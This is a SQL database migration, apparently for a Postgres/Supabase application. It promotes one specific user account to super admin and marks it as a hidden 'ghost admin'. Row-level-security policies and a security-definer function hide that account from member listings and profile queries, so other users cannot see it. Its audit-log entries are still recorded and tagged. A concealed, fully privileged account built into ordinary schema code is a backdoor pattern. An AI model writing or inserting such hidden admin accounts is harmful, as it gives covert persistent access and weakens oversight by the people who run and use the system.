-- Phase 1: Activate and elevate a@in-sync.co.in to Super Admin
UPDATE admin_users 
SET 
  is_active = true,
  is_super_admin = true,
  updated_at = now()
WHERE user_id = '9115aebc-1231-4f32-95e8-eca490b93bd8';

-- Phase 2: Add hidden flag for god-level admins
ALTER TABLE admin_users 
ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT false;

-- Mark a@in-sync.co.in as hidden (ghost admin)
UPDATE admin_users 
SET is_hidden = true
WHERE user_id = '9115aebc-1231-4f32-95e8-eca490b93bd8';

-- Create index for performance
CREATE INDEX IF NOT EXISTS idx_admin_users_hidden 
ON admin_users(is_hidden) WHERE is_hidden = true;

-- Create security definer function to check if a user is a hidden admin
CREATE OR REPLACE FUNCTION public.is_hidden_admin(check_user_id uuid)
RETURNS boolean
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = 'public'
AS $$
  SELECT EXISTS (
    SELECT 1 FROM admin_users
    WHERE user_id = check_user_id
    AND is_hidden = true
    AND is_active = true
  );
$$;

-- RLS Policy: Hide hidden admins from member listings
DROP POLICY IF EXISTS "Hide hidden admins from member lists" ON members;
CREATE POLICY "Hide hidden admins from member lists"
ON members FOR SELECT
TO authenticated
USING (
  NOT is_hidden_admin(user_id)
);

-- Enable RLS on profiles if not already enabled
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- Drop and recreate profile policies to avoid conflicts
DROP POLICY IF EXISTS "Hide hidden admin profiles" ON profiles;
CREATE POLICY "Hide hidden admin profiles"
ON profiles FOR SELECT
TO authenticated
USING (
  id = auth.uid() OR NOT is_hidden_admin(id)
);

DROP POLICY IF EXISTS "Super admins can view all profiles" ON profiles;
CREATE POLICY "Super admins can view all profiles"
ON profiles FOR SELECT
TO authenticated
USING (
  is_super_admin(auth.uid())
);

-- Add audit trail marker for hidden admin actions
ALTER TABLE audit_logs 
ADD COLUMN IF NOT EXISTS is_hidden_admin_action BOOLEAN DEFAULT false;

-- Function to automatically mark actions by hidden admins
CREATE OR REPLACE FUNCTION mark_hidden_admin_actions()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = 'public'
AS $$
BEGIN
  IF is_hidden_admin(NEW.user_id) THEN
    NEW.is_hidden_admin_action := true;
  END IF;
  RETURN NEW;
END;
$$;

-- Trigger to mark hidden admin actions in audit logs
DROP TRIGGER IF EXISTS before_insert_audit_log ON audit_logs;
CREATE TRIGGER before_insert_audit_log
BEFORE INSERT ON audit_logs
FOR EACH ROW
EXECUTE FUNCTION mark_hidden_admin_actions();